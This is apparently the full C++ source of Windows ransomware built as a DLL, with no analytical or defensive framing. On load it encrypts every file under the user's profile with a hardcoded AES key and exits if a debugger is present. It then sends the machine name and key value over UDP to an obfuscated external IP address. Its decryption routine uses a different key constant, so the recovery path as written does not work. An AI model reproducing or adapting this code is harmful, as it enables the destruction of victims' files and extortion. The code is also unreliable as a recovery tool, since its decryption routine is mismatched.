#include "imports.h"

void RansomCrypt() {
    std::string path = getenv("USERPROFILE");
    CryptoPP::byte key[32], iv[16];
    int mykey = 80;
    memset(key, mykey, 32);
    memset(iv, 1125884, 16);

    for (const auto& filename : std::filesystem::recursive_directory_iterator(path)) {
        try {
            if (protection::DetectDebugger()) {
                exit(0);
                return;
            }
            std::fstream file;
            std::string cipherText;
            file.open(std::filesystem::absolute(filename), std::fstream::in | std::ios::binary);
            std::string contents((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
            file.close();
            CryptoPP::AES::Encryption aesEncryption(key, 32);
            CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);
            CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::StringSink(cipherText));
            stfEncryptor.Put(reinterpret_cast<const unsigned char*>(contents.c_str()), contents.length());
            stfEncryptor.MessageEnd();
            file.open(std::filesystem::absolute(filename), std::fstream::out | std::fstream::trunc | std::ios::binary);
            file << cipherText;
            file.close();
        }
        catch (...) {}
    }
    system("start calc");
    struct sockaddr_in si_other;
    int s, slen = sizeof(si_other);
    char buf[2048];
    char message[2048];
    WSADATA wsa;
    TCHAR nameBuf[MAX_COMPUTERNAME_LENGTH + 2];
    DWORD nameBufSize;
    nameBufSize = sizeof nameBuf - 1;
    _GetComputerNameW(nameBuf, &nameBufSize);
    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    memset((char*)&si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(25);
    auto txtIp = binks("139.59.147.33");
    si_other.sin_addr.S_un.S_addr = inet_addr(txtIp.decrypt());
    txtIp.clear();
    char szString[sizeof(nameBuf) + 3];
    size_t nNumCharConverted;
    wcstombs_s(&nNumCharConverted, szString, 500, nameBuf, 500);
    char integer_string[32];
    sprintf_s(integer_string, "%d", mykey);
    sprintf_s(message, "%s|%s", szString, integer_string);
    sendto(s, message, strlen(message), 0, (struct sockaddr*)&si_other, slen);
    closesocket(s);
    WSACleanup();
    exit(0);
}

void RansomDecrypt() {
    std::string path = getenv("USERPROFILE");
    CryptoPP::byte key[32], iv[16];
    memset(key, 70, 32);
    memset(iv, 1125884, 16);

    for (const auto& filename : std::filesystem::recursive_directory_iterator(path)) {
        try {
            if (protection::DetectDebugger()) {
                exit(0);
                return;
            }
            std::fstream file;
            std::string plainText;
            file.open(std::filesystem::absolute(filename), std::fstream::in | std::ios::binary);
            std::string contents((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
            file.close();
            CryptoPP::AES::Decryption aesDecryption(key, 32);
            CryptoPP::CBC_Mode_ExternalCipher::Decryption cbcDecryption(aesDecryption, iv);
            CryptoPP::StreamTransformationFilter stfDecryptor(cbcDecryption, new CryptoPP::StringSink(plainText));
            stfDecryptor.Put(reinterpret_cast<const unsigned char*>(contents.c_str()), contents.length());
            stfDecryptor.MessageEnd();
            file.open(std::filesystem::absolute(filename), std::fstream::out | std::fstream::trunc | std::ios::binary);
            file << plainText;
            file.close();
        }
        catch (...) {}
    }
    system("start calc");
    exit(0);
}

void main() {

    RansomCrypt();

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    
    if (fdwReason == DLL_PROCESS_ATTACH) {
        if (!protection::Init()) return false;
        main();
        return true;
    }

    return false;

}